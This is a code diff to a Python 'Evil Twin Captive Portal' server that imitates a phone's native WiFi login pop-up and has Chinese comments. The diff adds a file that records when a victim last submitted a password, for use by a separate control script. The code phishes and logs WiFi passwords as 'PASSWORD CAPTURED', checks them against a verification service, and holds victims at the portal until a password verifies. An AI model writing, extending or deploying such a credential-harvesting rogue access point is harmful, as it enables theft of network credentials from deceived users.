@@ -9,9 +9,11 @@ Evil Twin Captive Portal - 仿手机系统原生 WiFi 认证弹窗
 - 验证失败 → 显示"密码错误，请重新输入"（表单保留可重输）
 - 严格模式：验证服务不可用时也不放行，显示"网络繁忙，请稍后重试"
 
-配置：环境变量 PORTAL_LOG / PORTAL_SSID_FILE / CTRL_VERIFY_URL（见 config.env.example）
+配置：环境变量 PORTAL_LOG / PORTAL_SSID_FILE / PORTAL_LAST_POST / CTRL_VERIFY_URL
+（见 config.env.example）
 """
 import os
+import time
 import http.server
 import socketserver
 import urllib.parse
@@ -20,6 +22,7 @@ import json
 
 LOG        = os.environ.get("PORTAL_LOG", "/opt/evil-twin/passwords.txt")
 SSID_FILE  = os.environ.get("PORTAL_SSID_FILE", "/opt/evil-twin/current_ssid")
+LAST_POST   = os.environ.get("PORTAL_LAST_POST", "/opt/evil-twin/last_post")
 VERIFY_URL = os.environ.get("CTRL_VERIFY_URL", "http://127.0.0.1:8090/api/verify")
 PORT       = 80
 
@@ -175,11 +178,18 @@ class Handler(http.server.BaseHTTPRequestHandler):
         length = int(self.headers.get("Content-Length", 0))
         data = self.rfile.read(length).decode("utf-8", "ignore")
         params = urllib.parse.parse_qs(data)
-        pwd = params.get("password", ["<empty>"])[0]
+        pwd = params.get("password", ["<empty>"])
+        pwd = pwd[0] if isinstance(pwd, list) else pwd
         line = "PASSWORD CAPTURED: %s\n" % pwd
         print(line, flush=True)
         with open(LOG, "a") as f:
             f.write(line)
+        # 记录最近一次密码提交时间（供 evil_control.py 判断受害者是否在交互）
+        try:
+            with open(LAST_POST, "w") as f:
+                f.write(str(int(time.time())))
+        except Exception:
+            pass
 
         if pwd and pwd != "<empty>":
             v = verify_password(pwd)
